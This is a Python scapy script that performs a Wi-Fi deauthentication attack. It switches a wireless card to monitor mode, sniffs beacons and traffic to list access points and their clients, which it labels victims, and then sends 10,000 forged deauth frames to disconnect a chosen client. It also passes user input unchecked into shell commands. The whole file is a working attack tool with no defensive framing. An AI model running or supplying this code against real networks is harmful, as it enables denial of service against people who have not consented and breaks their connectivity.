from pip._vendor.distlib.compat import raw_input
from scapy.all import *
import os
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt

victim_list = []  # check list for the handler of the packets
ap_macs = []
ap_list = {}  # dictionary of all access point and the values are the clients of the access point


def PacketHandler(packet):
    layer = packet.getlayer(Dot11)
    if packet.haslayer(Dot11Beacon) and layer.addr2 not in ap_list:
        ap_list[layer.addr2] = []
        ap_macs.append(layer.addr2)
        print('Detected AP     : "%s" - %s' % (packet.getlayer(Dot11Elt).info.decode('UTF-8'), layer.addr2))

        # Filter packages from the victim to the access point
    elif layer.addr2 is not None and layer.addr2 not in victim_list and layer.addr1 in ap_list:
        victim_list.append(layer.addr2)
        ap_list[layer.addr1].append(layer.addr2)
        print('Detected victim : {} -> {}'.format(layer.addr2, layer.addr1))


def DeautAttack():
    os.system("ls /sys/class/net/")
    networkCard = raw_input("Choose wireless Interface: ")
    os.system('ip link set %s down' % networkCard)
    os.system('iwconfig %s mode monitor' % networkCard)
    os.system('ip link set %s up' % networkCard)

    # change the channel to scan
    channel = input("please enter the channel you want to scan (if no number entered it will set to default): ")
    if len(channel) != 0:
        os.system("iw dev %s set channel %s" % (networkCard, channel))

    print('Now scanning for available networks ad victims, press ctrl+c to exit the scan')
    # sniffing the 802.11 packets and return a dictionary with all AP's and clients
    sniff(iface=networkCard, prn=PacketHandler, timeout=60)

    # After finish sniffing show all the AP's MAC addresses
    print("The AP mac addresses are: ")
    print(list(ap_list.keys()))

    # Getting the mac address of the AP the user want to attack
    BSSID = ap_macs[int(input("enter the place number in the list of the AP MAC address you like to attack: ")) - 1]
    print(ap_list[BSSID])

    # victimMac_number = input("enter the place number in the list of the MAC address of client you like to attack: ")
    victimMac = ap_list[BSSID][int(input("enter the place number in the list of the MAC address of client you like to attack: ")) - 1]

    # print the AP MAC and the client Mac
    print(f'Sending deauth packets now, to {BSSID} -> {victimMac} press ctrl+c to end the attack')

    # creating a malicious packet
    pkt = RadioTap() / Dot11(addr1=victimMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()

    # sending the packet to the mac address which we want to attack
    sendp(pkt, iface=networkCard, count=10000, inter=.1)


def main():
    DeautAttack()


if __name__ == "__main__":
    main()
